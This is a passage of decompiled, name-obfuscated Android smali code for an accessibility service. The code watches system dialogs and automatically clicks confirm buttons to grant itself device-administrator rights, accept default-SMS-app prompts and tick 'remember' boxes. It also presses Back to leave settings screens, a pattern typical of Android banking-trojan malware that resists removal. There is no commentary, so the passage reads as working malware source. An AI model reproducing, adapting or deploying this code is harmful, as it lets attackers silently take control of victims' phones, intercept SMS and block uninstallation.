    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_10

    const/16 v1, 0xe

    goto/16 :goto_9

    :pswitch_2
    const/4 v3, 0x1

    :try_start_7
    invoke-static {v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Z)Ljava/lang/Class;

    move-result-object v3

    invoke-static {v12, v9, v10, v13, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Class;)Landroid/content/Intent;

    move-result-object v3

    goto/16 :goto_d

    :pswitch_3
    const/4 v3, 0x0

    invoke-static {v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Z)Ljava/lang/Class;

    move-result-object v3

    invoke-static {v12, v9, v10, v13, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Class;)Landroid/content/Intent;

    move-result-object v3

    goto/16 :goto_d

    :pswitch_4
    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v14, 0x10

    if-lt v13, v14, :cond_14

    const/4 v13, 0x1

    invoke-virtual {p0, v13}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto/16 :goto_d

    :catch_1
    move-exception v0

    :cond_17
    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto/16 :goto_a

    :pswitch_5
    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/u;

    invoke-direct {v0, p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/u;-><init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;)V

    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/u;->start()Landroid/os/CountDownTimer;

    goto/16 :goto_5

    :pswitch_6
    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;-><init>(Landroid/content/Context;)V

    const-string v1, "dchec2k2"

    invoke-virtual {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_18

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/4 v2, 0x0

    invoke-direct {p0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    :cond_18
    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->close()V

    goto/16 :goto_5

    :pswitch_7
    if-eqz v0, :cond_19

    const/4 v0, 0x1

    iput-boolean v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->f:Z

    goto/16 :goto_5

    :cond_19
    const/4 v0, 0x0

    iput-boolean v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->f:Z

    goto/16 :goto_5

    :pswitch_8
    const/16 v0, 0x1388

    invoke-direct {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(I)V

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z

    goto/16 :goto_5

    :pswitch_9
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x13

    if-ge v0, v1, :cond_1a

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    invoke-direct {p0, v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    :cond_1a
    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_d

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/v;

    invoke-direct {v0, p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/v;-><init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;)V

    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/v;->start()Landroid/os/CountDownTimer;

    goto/16 :goto_5

    :pswitch_a
    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "com.android.systemui:id/remember"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "android:id/button1"

    aput-object v4, v2, v3

    invoke-virtual {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    goto/16 :goto_5

    :pswitch_b
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x15

    if-lt v1, v3, :cond_1b

    sget-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Z

    if-eqz v1, :cond_1b

    const-string v1, "android.app.AlertDialog"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1b

    sget-boolean v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b:Z

    if-nez v1, :cond_1b

    const/4 v0, 0x0

    sput-boolean v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Z

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "com.android.systemui:id/remember"

    aput-object v4, v2, v3

    invoke-virtual {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/w;

    invoke-direct {v0, p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/w;-><init>(Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;)V

    invoke-virtual {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/w;->start()Landroid/os/CountDownTimer;

    goto/16 :goto_3

    :cond_1b
    const-string v1, "android.app.Dialog"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1c

    const-string v1, "android.app.AlertDialog"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_1c

    const-string v1, "com.android.settings.SmsDefaultDialog"

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1d

    :cond_1c
    if-nez v0, :cond_1d

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v6, "android:id/button1"

    aput-object v6, v3, v4

    invoke-virtual {p0, v1, v2, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    :cond_1d
    iget-boolean v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->f:Z

    if-eqz v1, :cond_1e

    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z

    const/4 v1, 0x0

    iput-boolean v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->f:Z

    const/16 v1, 0x3e8

    invoke-direct {p0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(I)V

    :cond_1e
    if-eqz v0, :cond_d

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    invoke-direct {p0, v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    goto/16 :goto_5

    :pswitch_c
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/ekvrxzfiopfbeglxzcuqigwlbadhiaqagspwclrctfypesbhmdmnrhumktqusvtowjkjyojnyzvxdn;

    invoke-direct {v1, v2, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x13

    if-lt v2, v3, :cond_20

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_1f

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "com.android.settings:id/action_button"

    aput-object v4, v2, v3

    invoke-virtual {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    goto/16 :goto_5

    :cond_1f
    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "com.android.settings:id/cancel_button"

    aput-object v4, v2, v3

    invoke-virtual {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->performGlobalAction(I)Z

    goto/16 :goto_5

    :cond_20
    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_21

    const/4 v0, 0x0

    iput v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x1

    invoke-direct {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V

    goto/16 :goto_5

    :cond_21
    const/4 v0, 0x0

    iput v0, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:I

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-direct {p0, v0, v1, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;II)V

    goto/16 :goto_5

    :catch_2
    move-exception v0

    goto/16 :goto_5

    :catch_3
    move-exception v1

    goto/16 :goto_8

    :catch_4
    move-exception v1

    goto/16 :goto_7

    :cond_22
    move v1, v0

    goto/16 :goto_b

    :sswitch_data_0
    .sparse-switch
        -0x73fd8eae -> :sswitch_0
        0x6b849a9c -> :sswitch_1
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
    .end packed-switch

    :sswitch_data_1
    .sparse-switch
        -0x60cfd5a5 -> :sswitch_a
        -0x5fabd583 -> :sswitch_6
        -0x5b412b51 -> :sswitch_d
        -0x5a01854c -> :sswitch_b
        -0x446e3259 -> :sswitch_f
        -0x34f6277c -> :sswitch_8
        -0x30970494 -> :sswitch_5
        -0x5911562 -> :sswitch_e
        0x8afc212 -> :sswitch_2
        0x1dd9e853 -> :sswitch_4
        0x25585fc6 -> :sswitch_3
        0x44f4b98f -> :sswitch_7
        0x7c6803d8 -> :sswitch_c
        0x7d896488 -> :sswitch_9
    .end sparse-switch

    :pswitch_data_1
    .packed-switch 0x1
        :pswitch_5
        :pswitch_6
        :pswitch_6
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_9
        :pswitch_a
        :pswitch_b
        :pswitch_b
        :pswitch_b
        :pswitch_b
        :pswitch_b
        :pswitch_c
    .end packed-switch

    :pswitch_data_2
    .packed-switch 0x0
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method protected onServiceConnected()V
    .locals 5

    const/4 v4, -0x1

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    const/16 v1, 0x5b

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    const-wide/16 v2, 0x0

    iput-wide v2, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    iput v4, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    iput v4, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    return-void
.end method
